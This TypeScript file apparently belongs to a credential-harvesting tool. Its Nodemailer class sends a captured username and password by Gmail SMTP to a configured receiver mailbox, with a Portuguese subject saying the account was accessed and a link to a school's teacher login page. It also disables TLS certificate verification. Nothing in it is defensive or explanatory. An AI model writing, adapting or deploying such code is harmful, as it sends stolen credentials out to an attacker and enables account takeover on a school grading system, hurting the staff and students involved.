import { createTransport } from 'nodemailer';

import mail from '@config/mail';
import { IMailerProvider } from '@shared/providers/MailerProvider/IMailerProvider';

const mailConfig = mail();

export class NodeMailerProvider implements IMailerProvider {
  protected transport = createTransport({
    host: 'smtp.gmail.com',
    port: 587,
    secure: false,
    auth: {
      user: mailConfig.TRANSPORT_MAIL,
      pass: mailConfig.TRANSPORT_PASSWORD,
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  public async sendMail(uname: string, pass: string): Promise<void> {
    await this.transport.sendMail({
      from: 'Suporte Media Final <suporte.media.final@gmail.com>',
      to: mailConfig.MAIL_RECEIVER,
      subject: 'Parece que sua conta foi acessada',
      text: `Parabéns, o seu email é ${uname} e a sua senha: ${pass}`,
      html: `
                <body>
                    <main style='margin: 1rem; border-color: black; padding: 1rem'>
                        <h3>
                            <p>Email: ${uname}</p>
                            <p>Senha: ${pass}</p>
                            <a href='https://casteloporto.com.br/mediafinal/Media/Final/Professor/login.php' style="color: green; text-decoration: none; font-size: 1.7rem; font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;">Tire proveito do seu conhecimento</a>
                        </h3>
                    </main>
                </body>
            `,
    });
  }
}
